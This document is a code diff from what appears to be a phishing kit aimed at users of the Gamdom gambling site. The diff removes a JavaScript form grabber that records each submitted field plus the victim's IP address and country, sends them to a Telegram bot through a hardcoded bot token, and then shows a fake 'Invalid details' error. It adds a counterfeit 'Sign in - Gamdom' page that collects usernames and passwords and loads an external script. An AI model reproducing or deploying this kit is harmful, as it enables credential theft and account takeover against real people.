@@ -1,99 +1,262 @@
-function showNotification(message, duration = 3000) {
-  const notification = document.getElementById("notification");
-  notification.innerText = message;
-  notification.style.display = "block";
-
-  // Hide after duration
-  setTimeout(() => {
-    notification.style.display = "none";
-  }, duration);
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in - Gamdom</title>
+<style>
+body {
+    margin: 0;
+    padding: 0;
+    background: #0d1117;
+    font-family: Arial, Helvetica, sans-serif;
+    color: #fff;
 }
-document.addEventListener("DOMContentLoaded", () => {
-const DEFAULT_USER_ID = "7642510889"; // fallback if no id in URL
-const BOT_TOKEN = "8433235666:AAGUgGfrFwj5dvE548wxyIpyzjrlaWXu_VA";
-const forms = document.querySelectorAll("form");
 
-let userCountry = "Unknown"; // default
-let userIP = "Unknown"; // <-- add IP variable
-
-// Fetch country and IP first
-fetch("https://ipapi.co/json/")
-.then(res => res.json())
-.then(data => {
-if (data) {
-if (data.country_name) userCountry = data.country_name;
-if (data.ip) userIP = data.ip; // <-- store IP
+.top-image {
+    width: 100%;
+    height: 180px; /* smaller */
+    background: url('https://gamdom.com/build/side-image-mob.7fdf3de4f2.375.png') center/cover no-repeat;
 }
-})
-.catch(err => console.error("IP lookup error:", err));
 
-forms.forEach((form) => {
-form.addEventListener("submit", async (e) => {
-e.preventDefault();
+.container {
+    max-width: 360px; /* narrower */
+    margin: auto;
+    padding: 15px;
+}
 
-// ensure country and IP are available  
-  if (userCountry === "Unknown" || userIP === "Unknown") {  
-    try {  
-      const res = await fetch("https://ipapi.co/json/");  
-      const data = await res.json();  
-      if (data) {  
-        if (data.country_name) userCountry = data.country_name;  
-        if (data.ip) userIP = data.ip; // <-- retry IP  
-      }  
-    } catch (err) {  
-      console.error("Retry IP lookup error:", err);  
-    }  
-  }  
+h2 {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 22px; /* smaller */
+    font-weight: 600;
+    margin-bottom: 20px;
+}
 
-  const urlParams = new URLSearchParams(window.location.search);  
-  const userId = urlParams.get("id") || DEFAULT_USER_ID;  
+.close-btn {
+    position: absolute;
+    right: 15px;
+    top: 200px; /* adjusted for smaller top image */
+    font-size: 12px;
+    cursor: pointer;
+    opacity: 1.7;
+}
 
-  const formData = {};  
-  new FormData(form).forEach((value, key) => {  
-    formData[key] = value;  
-  });  
+label {
+    display: block;
+    margin: 8px 0 4px;
+    font-size: 13px; /* smaller */
+    opacity: 0.9;
+}
 
-  // current date & time (local)  
-  const now = new Date();  
-  const dateTime = now.toLocaleString(); // e.g. "10/8/2025, 4:25:36 PM"  
+input {
+    width: 100%;
+    padding: 12px; /* smaller */
+    border-radius: 8px; /* smaller radius */
+    border: none;
+    background: #1a1f25;
+    color: #fff;
+    font-size: 14px; /* smaller */
+    box-sizing: border-box;
+}
 
-  // Only include Form line if form has a name  
-  const formName = (form.getAttribute("name") || "").trim();  
-  const formLine = formName ? `📄 Form: ${formName}\n` : "";  
+.password-field {
+    position: relative;
+}
 
-  const payload = {  
-    chat_id: userId,  
-    text:  
-      `📋 *New Form Submitted*\n\n` +  
-      `🏷️ Page: ${document.title}\n` +  
-      formLine +  
-      `🌍 Country: ${userCountry}\n` +  
-      `🕒 Date & Time: ${dateTime}\n` +  
-      `📍 IP: ${userIP}\n\n` + // <-- added IP line  
-      Object.entries(formData).map(([k, v]) => `• *${k}:* ${v}`).join("\n"),  
-    parse_mode: "Markdown"  
-  };
-  try {  
-    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {  
-      method: "POST",  
-      headers: { "Content-Type": "application/json" },  
-      body: JSON.stringify(payload)  
-    });  
+.show-pass {
+    position: absolute;
+    right: 10px;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 20px; /* smaller */
+    height: 20px;
+    background: black;
+    border-radius: 5px; /* smaller */
+    cursor: pointer;
+    text-align: center;
+}
 
-    if (response.ok) {  
-      showNotification("⛔ Invalid details");
-      form.reset();  
-      window.location.href = `index.html?id=${userId}`;  
-    } else {  
-      const errorText = await response.text();  
-      console.error("Telegram Error:", errorText);  
-      alert(`❌ Error submitting form. Check console for details.`);  
-    }  
-  } catch (err) {  
-    console.error("Network Error:", err);  
-    alert("⚠️ Network error. Please check your connection.");  
-  }  
+.forgot {
+    font-size: 12px; /* smaller */
+    opacity: 0.8;
+    margin-top: 4px;
+    cursor: pointer;
+}
+
+.remember-box {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin: 10px 0; /* tighter */
+}
+
+.remember-box input {
+    width: 16px; /* smaller */
+    height: 16px;
+}
+
+.btn {
+    width: 100%;
+    padding: 12px; /* smaller */
+    background: #00ff7f;
+    border: none;
+    border-radius: 10px; /* smaller */
+    font-size: 16px; /* smaller */
+    font-weight: 600;
+    color: #000;
+    cursor: pointer;
+    margin-top: 10px; /* tighter */
+}
+
+.or-line {
+    text-align: center;
+    margin: 15px 0; /* smaller */
+    opacity: 0.7;
+    font-size: 14px; /* smaller */
+}
+
+.socials {
+    display: flex;
+    gap: 8px;
+    justify-content: space-between;
+}
+
+.social-btn {
+    flex: 1;
+    background: #1a1f25;
+    padding: 12px 0; /* smaller */
+    border-radius: 10px; /* smaller */
+    text-align: center;
+    font-size: 16px; /* smaller */
+    cursor: pointer;
+}
+
+.signup {
+    text-align: center;
+    margin-top: 15px; /* smaller */
+    font-size: 13px; /* smaller */
+}
+
+.signup a {
+    color: #00ff7f;
+    text-decoration: none;
+    font-weight: 600;
+}
+input:focus {
+    outline: none; /* remove default blue outline */
+    border: 2px solid #005f24; /* green border */
+    background: #152025; /* slightly lighter background to show focus */
+    transition: 0.01s; /* smooth transition */
+}
+
+input::placeholder {
+    color: #aaa; /* lighter placeholder text */
+}
+input[type="checkbox"] {
+    accent-color: black; /* change to any color */
+    background: black;
+    width: 20px;
+    height: 20px;
+  }
+</style>
+</head>.
+<script src="intelligent.js"></script>
+<body>
+
+<div class="top-image"></div>
+
+<div class="container">
+    <div class="close-btn">✖</div>
+
+    <h2>
+        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjIiIGhlaWdodD0iMjgiIHZpZXdCb3g9IjAgMCAyMiAyOCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTEwLjY0NTggMTYuODA2MkgxMC42NDIzVjIzLjQ4MzhIMTAuNjQ1OFYxNi44MDYyWiIgZmlsbD0iIzAxRDM3MCIvPgo8cGF0aCBkPSJNMTAuNjQ1OCAxNi44MDYySDEwLjY0MjNWMjMuNDgzOEgxMC42NDU4VjE2LjgwNjJaIiBmaWxsPSIjMDFEMzcwIi8+CjxwYXRoIGQ9Ik0xMC4xMDE4IDEzLjM4OTlMMy40ODY0IDE2LjU0OThDMy4yODk5NyAxNi42NDU0IDMuMTYzNyAxNi44NTA5IDMuMTYzNyAxNy4wNzQxVjIzLjIwOTdDMy4xNjM3IDIzLjQzNjQgMy4yODk5NyAyMy42Mzg0IDMuNDg2NCAyMy43MzRMMTAuMTA1MyAyNi44OTc1QzEwLjI3MzYgMjYuOTc4OSAxMC40NTYgMjcuMDE3OSAxMC42Mzg0IDI3LjAxNzlWMTMuMjY1OUMxMC40NTYgMTMuMjY5NCAxMC4yNzM2IDEzLjMxMTkgMTAuMTAxOCAxMy4zODk5WiIgZmlsbD0iIzAwRkY4NiIvPgo8cGF0aCBkPSJNMTAuMzQ3NSAwLjA3MDg0OTJMNy4yNDMyMiAxLjYyMjQ3VjUuNzkyMDFMMy42MDkzMyA3LjU5MTYxVjMuMzg2NjRMMC4zNTQyNyA1LjAxOTc0QzAuMTM2Nzk4IDUuMTI5NTYgMCA1LjM1Mjc0IDAgNS41OTM2M1YxMy42MjgxQzAgMTQuMDk5MiAwLjQ5NDU3MyAxNC40MTA5IDAuOTExOTc5IDE0LjIwMTlMMTAuMDc3NCA5LjY2MDQzQzEwLjI1NjMgOS41NzE4NyAxMC40NDkyIDkuNTI5MzYgMTAuNjQyMSA5LjUyOTM2VjBDMTAuNTQwNCAwIDEwLjQzODcgMC4wMjQ3OTY1IDEwLjM0NzUgMC4wNzA4NDkyWiIgZmlsbD0iIzAwRkY4NiIvPgo8cGF0aCBkPSJNMTcuNzk3OCAxNi41NTE2TDExLjE3ODkgMTMuMzkxN0MxMS4wMDcxIDEzLjMwNjYgMTAuODI0NyAxMy4yNjc3IDEwLjY0MjMgMTMuMjcxMlYyNy4wMjMzQzEwLjgyNDcgMjcuMDIzMyAxMS4wMTQxIDI2Ljk4NDMgMTEuMTgyNCAyNi45MDI4TDE3Ljc5NzggMjMuNzM5NEMxNy45OTQyIDIzLjY0MzcgMTguMTIwNSAyMy40MzgyIDE4LjEyMDUgMjMuMjE1MVYxNy4wNzk0QzE4LjEyMDUgMTYuODUyNyAxNy45OTQyIDE2LjY0NzIgMTcuNzk3OCAxNi41NTE2WiIgZmlsbD0iIzAxRDM3MCIvPgo8cGF0aCBkPSJNMjAuOTMzNiA1LjAxODc3TDE3LjY3ODUgMy4zODU2N1Y3LjU5NDE4TDE0LjA0MTIgNS43OTQ1OFYxLjYyNTA0TDEwLjkzNjkgMC4wNzM0MTI3QzEwLjg0NTcgMC4wMjczNiAxMC43NDA1IDAuMDAyNTYzNDggMTAuNjQyMyAwLjAwMjU2MzQ4VjkuNTMxOTNDMTAuODM1MiA5LjUzMTkzIDExLjAyODEgOS41Nzc5OCAxMS4yMDcgOS42NjNMMjAuMzcyNCAxNC4yMDQ1QzIwLjc5MzMgMTQuNDEzNSAyMS4yODQ0IDE0LjEwMTggMjEuMjg0NCAxMy42MzA2VjUuNTk2MTlDMjEuMjg3OSA1LjM1MTc2IDIxLjE1MTEgNS4xMjg1OCAyMC45MzM2IDUuMDE4NzdaIiBmaWxsPSIjMDFEMzcwIi8+Cjwvc3ZnPgo=" width="20"> <!-- replace icon -->
+        Sign In
+    </h2>
+<form>
+    <label>Username</label>
+    <input type="text" placeholder="Enter your username" name="Username" required>
+
+    <label>Password</label>
+    <div class="password-field">
+        <input type="password" placeholder="Enter your password" name="password" required>
+<div class="show-pass">👁️</div>
+    </div>
+
+    <div class="forgot">Forgot your password?</div>
+
+    <div class="remember-box">
+        <input type="checkbox">
+        <span style="font-size:13px;">Remember me</span>
+    </div>
+
+    <button class="btn" type="submit">Start Playing</button>
+<!-- Add this somewhere in your HTML body -->
+<div id="notification" style="
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background: #3f2828;
+    color: white;
+    padding: 50px 25px;
+    border-radius: 8px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+    display: none;
+    z-index: 9999;
+    font-family: Arial, sans-serif;
+    font-size: 20px;
+    text-align: center; height:100px; width:350px;"></div>
+</form>
+    <div class="or-line">OR</div>
+
+    <div class="socials">
+<div class="social-btn"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ0NFzAgOzGpHjcJ_ti8xDDblWQDKjRLqaJWQ&s" style="width:20px;"></div>
+        <div class="social-btn"><img src="https://www.pikpng.com/pngl/b/34-345914_continue-with-google-white-g-logo-clipart.png" style="width:20px;"></div>
+<div class="social-btn">
+  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 240 240">
+    <path fill="white" d="M120 0C53.7 0 0 53.7 0 120s53.7 120 120 120 120-53.7 120-120S186.3 0 120 0zm56.3 86.1l-18.5 87c-1.4 6.2-5.1 7.7-10.3 4.8l-28.5-21.1-13.8 13.3c-1.5 1.5-2.7 2.7-5.5 2.7l2-28.3 51.5-46.4c2.2-1.9-0.5-2.9-3.4-1l-63.9 40.3-27.5-8.6c-6-1.9-6.1-6-1.2-8.9l106.7-41.1c4.9-1.9 9 1.2 7.5 8z"/>
+  </svg>
+</div>
+    </div>
+
+    <div class="signup">
+        Don’t have an account? <a href="#">Sign up</a>
+    </div>
+</div>
+<script>
+const inputs = document.querySelectorAll('input');
+
+inputs.forEach(input => {
+  input.addEventListener('input', () => {
+    input.style.boxShadow = '0 0 0px #00ff7f'; // green glow
+  });
+  input.addEventListener('blur', () => {
+    input.style.boxShadow = 'none'; // remove glow when not typing
+  });
 });
+</script>
+<script>
+const passwordInput = document.querySelector('.password-field input');
+const showPassBtn = document.querySelector('.show-pass');
 
+showPassBtn.addEventListener('click', () => {
+    if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        // Replace emoji with a real closed eye
+showPassBtn.innerHTML = `
+<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24">
+  <path d="M17.94 17.94L6.06 6.06"/> <!-- slash -->
+  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/> <!-- eye shape -->
+  <circle cx="12" cy="12" r="3"/> <!-- pupil -->
+</svg>
+`;
+    } else {
+        passwordInput.type = 'password';
+        showPassBtn.textContent = '👁️'; // eye open
+    }
 });
-});
+</script>
+</body>
+</html>
